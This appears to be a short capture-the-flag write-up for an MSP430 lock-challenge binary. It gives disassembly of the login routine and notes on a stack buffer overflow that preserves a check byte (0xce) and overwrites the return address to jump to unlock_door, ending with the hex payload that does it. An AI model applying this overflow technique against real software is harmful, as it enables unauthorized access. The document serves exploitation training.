




4446 <unlock_door>
4446:  3012 7f00      push	#0x7f
444a:  b012 9445      call	#0x4594 <INT>
444e:  2153           incd	sp
4450:  3041           ret


4452 <test_password_valid>
4452:  0412           push	r4
4454:  0441           mov	sp, r4
4456:  2453           incd	r4
4458:  2183           decd	sp
445a:  c443 fcff      mov.b	#0x0, -0x4(r4)
445e:  3e40 fcff      mov	#0xfffc, r14
4462:  0e54           add	r4, r14
4464:  0e12           push	r14
4466:  0f12           push	r15
4468:  3012 7d00      push	#0x7d
446c:  b012 9445      call	#0x4594 <INT>
4470:  5f44 fcff      mov.b	-0x4(r4), r15
4474:  8f11           sxt	r15
4476:  3152           add	#0x8, sp
4478:  3441           pop	r4
447a:  3041           ret


447c .strings:
447c: "Enter the password to continue."
449c: "Remember: passwords are between 8 and 16 characters."
44d1: "Access granted."
44e1: "That password is not correct."
44ff: "Invalid Password Length: password too long."
452b: ""


452c <login>
452c:  3150 eeff      add	#0xffee, sp
4530:  f140 ce00 1100 mov.b	#0xce, 0x11(sp)
4536:  3f40 7c44      mov	#0x447c "Enter the password to continue.", r15
453a:  b012 f845      call	#0x45f8 <puts>
453e:  3f40 9c44      mov	#0x449c "Remember: passwords are between 8 and 16 characters.", r15
4542:  b012 f845      call	#0x45f8 <puts>
4546:  3e40 3f00      mov	#0x3f, r14
454a:  3f40 0024      mov	#0x2400, r15
454e:  b012 e845      call	#0x45e8 <getsn>
4552:  3e40 0024      mov	#0x2400, r14
4556:  0f41           mov	sp, r15
4558:  b012 2446      call	#0x4624 <strcpy>
455c:  0f41           mov	sp, r15
455e:  b012 5244      call	#0x4452 <test_password_valid>
4562:  0f93           tst	r15
4564:  0524           jz	#0x4570 <login+0x44>
4566:  b012 4644      call	#0x4446 <unlock_door>
456a:  3f40 d144      mov	#0x44d1 "Access granted.", r15
456e:  023c           jmp	#0x4574 <login+0x48>
4570:  3f40 e144      mov	#0x44e1 "That password is not correct.", r15
4574:  b012 f845      call	#0x45f8 <puts>
4578:  f190 ce00 1100 cmp.b	#0xce, 0x11(sp)
457e:  0624           jeq	#0x458c <login+0x60>
4580:  3f40 ff44      mov	#0x44ff "Invalid Password Length: password too long.", r15
4584:  b012 f845      call	#0x45f8 <puts>
4588:  3040 3c44      br	#0x443c <__stop_progExec__>
458c:  3150 1200      add	#0x12, sp
4590:  3041           ret


------------

when the program ends with wrong password it prints message

4570:  3f40 e144      mov	#0x44e1 "That password is not correct.", r15
4574:  b012 f845      call	#0x45f8 <puts>
4578:  f190 ce00 1100 cmp.b	#0xce, 0x11(sp)

last 2 instructions of login

458c:  3150 1200      add	#0x12, sp
4590:  3041           ret


sp + 0x12 == 43fe


aim here:
    43fe

43d0:   0000 0000 0000 0000 0000 0000 0000 a845   ...............E
43e0:   0000 f245 0200 0024 3f00 6245 3132 3334   ...E...$?.bE1234
43f0:   3536 3738 3930 6162 6364 6566 67ce 3c44   567890abcdefg.<D




need password to be longer than expected and overwrite the memory

need byte 18 to be 0xce so it pass check at 4578 then put ret address to the unlock_door

17 byte + 0xce + ret address

4141414141414141414141414141414141ce4644
